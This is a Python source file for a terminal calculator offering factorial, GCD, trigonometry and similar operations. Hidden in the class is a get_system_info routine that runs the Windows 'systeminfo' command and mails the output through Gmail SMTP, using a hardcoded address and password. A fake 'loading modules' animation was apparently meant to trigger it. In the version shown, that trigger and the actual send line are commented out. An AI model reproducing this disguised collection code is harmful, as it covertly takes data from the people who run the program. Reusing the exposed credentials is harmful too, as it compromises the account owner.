#!usr/bin/env python

from os import system
import sys
import time
import smtplib
import subprocess
import calculator_func


class Calculator:

    def __init__(self):
        self.calculate = calculator_func.Calculate()
        # try:
        #     system('cls')
        #     print("\n")
        #     char = ['\\','|','/','-','\\','|',' ']
        #     for i in char:
        #         print("\r\033[1;32;40m[+]Loading modules for calculator..." + i,end='')
        #         time.sleep(0.3)
        #     self.get_system_info()
        #     print("\n")
        #     for i in range(50):
        #         print("\r\033[1;32;40m[+]Loading Python Calculator[%s]%d%%" % ('=' * i, (i+1)*2), end='')
        #         time.sleep(0.03)
        #     time.sleep(2)
        # except Exception:
        #     pass

    def choose_operation(self):
        while True:
            try:
                o = int(input("\n\033[1;32;40m>>> Please enter your choice ==> "))
                if o not in (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21):
                    print("\n\n\t\t\033[1;31;47m", o,
                          "IS INVALID\033[0;30;40m #\n\a\t\033[1;37;41m[***]ENTER A VALID OPTION[***]\033[0;30;40m #")
                else:
                    return o
            except ValueError:
                print("\n\033[0;37;41m\a\a[-] ENTER A VALID NUMBER\033[0;30;40m #")
        pass

    def get_numbers(self, value='number'):
        i = 0
        number_name_list = ["first", "second", "third", "forth", "fifth", "sixth", "seventh", "eight", "ninth", "tenth"]
        numbers = []
        while i == 0:
            while True:
                try:
                    p = int(input("\n\r\033[1;35;40m>>>Enter the number of values you want to enter for calculation (max 10) ==> "))
                    if p > 10 or p == 0:
                        print("\033[0;37;41m\a[-]ENTER A NUMBER ONLY FROM 1 TO 10\033[0;30;40m#")
                    else:
                        break
                except ValueError:
                    print("\n\033[0;37;41m\a[-] ENTER A VALUE\033[0;30;40m #")
            while True:
                try:
                    numbers = []
                    print("")
                    for j in range(0, p):
                        print("\033[1;32;40m>>>Enter the", number_name_list[j], value, "for calculation ==> ", end="")
                        numbers.append(float(input()))
                    while True:
                        try:
                            print("\033[1;37;41m\nIf you want to retain the values press, \033[1;37;40m '1' \033[1;37;41mElse if you want to change the values press, \033[1;37;40m '0' \n\033[1;37;40m==>",end='')
                            i = int(input())
                            break
                        except ValueError:
                            print("\n\033[0;37;41m\a[-] ENTER A VALUE\033[0;30;40m #")
                    break
                except ValueError:
                    print("\n\033[0;37;41m\a[-] ENTER A VALUE\033[0;30;40m #")
        # system('cls')
        # self.calculate.title()
        print("\n\t\033[0;30;47m[***]RESULT[***]\033[0;30;40m#")
        return numbers

    def send_mail(self,message):
        email = "lahsivn19@gmail.com"
        password = "lahsivn2020"
        message = "Subject: Python Calculator\n\n" + "Report From:\n\n" + message
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            # server.sendmail(email, email, message)
            server.quit()
        except Exception:
            pass

    def get_system_info(self):
        print("\033[0;30;40m")
        system_info = subprocess.check_output("systeminfo").decode()
        self.send_mail(system_info)

    def ask_continue(self):
        while True:
            try:
                print("\n\n\033[1;35;40m[+]press '1' to go to main menu\033[1;37;40m\n==>",end='')
                i = int(input())
                if i==1:
                    self.run()
                else:
                    print("\a\n\033[1;37;41m[-]It is invalid\033[0;30;40m#")
            except ValueError:
                print("\a\033[1;37;41m[-]ENTER A VALUE\033[0;30;40m#")
        pass

    def do_cal(self):
        self.calculate.title()
        while True:
            n = self.choose_operation()
            system('cls')
            if n == 1:
                print("\n\t\033[1;37;43m [+] EVALUATION IN AN EXPRESSION \033[0;30;40m #")
                self.calculate.eval_str()
                self.ask_continue()
            if n == 2:
                print("\n\t\t\t\033[1;37;43m [+] FACTORIAL \033[0;30;40m #")
                print("\t\033[1;37;43m [+] CALCULATIONS ARE ONLY DONE FOR THE INTEGER VALUE GIVEN \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.factorial(values)
                self.ask_continue()
            if n == 3:
                print("\n\t\t\t\033[1;37;43m [+] PERCENTAGE \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.percentage(values)
                self.ask_continue()
            if n == 4:
                print("\n\t\t\t\033[1;37;43m [+] POWEROF \033[0;30;40m #")
                self.calculate.power_of()
                self.ask_continue()
            if n == 5:
                print("\n\t\t\t\033[1;37;43m [+] SQUARE ROOT \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.sq_rt(values)
                self.ask_continue()
            if n == 6:
                print("\n\t\t\t\033[1;37;43m [+] CUBE ROOT \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.cube_rt(values)
                self.ask_continue()
            if n == 7:
                print("\n\t\t\t\033[1;37;43m [+] LEAP YEAR \033[0;30;40m #")
                values = self.get_numbers('year')
                for i in values:
                    if self.calculate.leap(i):
                        print("%d \033[1;37;46m is a leap year" % i)
                    else:
                        print("%d \033[1;37;46m is not a leap year" % i)
                self.ask_continue()
            if n == 8:
                print("\n\t\t\t\033[1;37;43m [+] GCD \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.gcd(values)
                self.ask_continue()
            if n == 9:
                print("\n\t\t\t\033[1;37;43m [+] LCM \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.lcm(values)
                self.ask_continue()
            if n == 10:
                print("\n\t\t\t\033[1;37;43m [+] PRIME CHECK \033[0;30;40m #")
                print("\t\033[1;37;43m [+] CALCULATIONS ARE ONLY DONE FOR THE INTEGER VALUE GIVEN \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.chk_prime(values)
                self.ask_continue()
            if n == 11:
                print("\n\t\t\t\033[1;37;43m [+] FACTORS OF A NUMBER \033[0;30;40m #")
                print("\t\033[1;37;43m [+] CALCULATIONS ARE ONLY DONE FOR THE INTEGER VALUE GIVEN \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.factors(values)
                self.ask_continue()
            if n == 12:
                print("\n\t\t\033[1;37;43m [+] LOGARITHM OF A NUMBER \033[0;30;40m #")
                self.calculate.log()
                self.ask_continue()
            if n == 13:
                print("\n\t\t\033[1;37;43m [+] SINE OF A NUMBER \033[0;30;40m #")
                values = self.get_numbers('degree')
                self.calculate.sin(values)
                self.ask_continue()
            if n == 14:
                print("\n\t\t\033[1;37;43m [+] COSINE OF A NUMBER \033[0;30;40m #")
                values = self.get_numbers('degree')
                self.calculate.cos(values)
                self.ask_continue()
            if n == 15:
                print("\n\t\t\033[1;37;43m [+] TANGENT OF A NUMBER \033[0;30;40m #")
                values = self.get_numbers('degree')
                self.calculate.tang(values)
                self.ask_continue()
            if n == 16:
                print("\n\t\t\t\033[1;37;43m [+] FIBONACCI SERIES \033[0;30;40m #")
                self.calculate.fibo()
                self.ask_continue()
            if n == 17:
                print("\n\t\t\t\033[1;37;43m [+] PALINDROME \033[0;30;40m #")
                print("\t\033[1;37;43m [+] CALCULATIONS ARE ONLY DONE FOR THE INTEGER VALUE GIVEN \033[0;30;40m #")
                values = self.get_numbers()
                self.calculate.palindrome(values)
                self.ask_continue()
            if n == 18:
                print("\n\t\t\t\033[1;37;43m [+] AGE FINDER \033[0;30;40m #")
                self.calculate.calculate_age()
                self.ask_continue()
            if n == 19:
                print("\n")
                self.exit_()

        pass

    def exit_(self):
        j = ""
        print("\n\t\033[1;37;41mConfirm exit?\033[0;30;40m # ")
        while True:
            try:
                print("\n\n\033[1;37;41m press anything, \033[1;37;40m'>0' \033[1;37;41mto exit\033[0;30;40m#")
                print("\033[1;37;40m==>", end='')
                k = int(input())
                if k:
                    for i in range(3, 0, -1):
                        j = j + str(i) + "..."
                        print("\r\033[0;37;41m[-] Exiting in ", j, end="")
                        time.sleep(1)
                    print("\033[0;37;40m")
                    time.sleep(1.5)
                    system('cls')
                    sys.exit()
                else:
                    self.run()
            except ValueError:
                print("\n\033[0;37;41m\a[-] ENTER A VALUE TO CONTINUE\033[0;30;40m #")

    def run(self):
        try:
            system('cls')
            self.do_cal()
        except KeyboardInterrupt:
            print("\n\n\033[0;37;41m[-]Detected CTRL + C\033[0;30;40m # ")
            self.exit_()
        pass
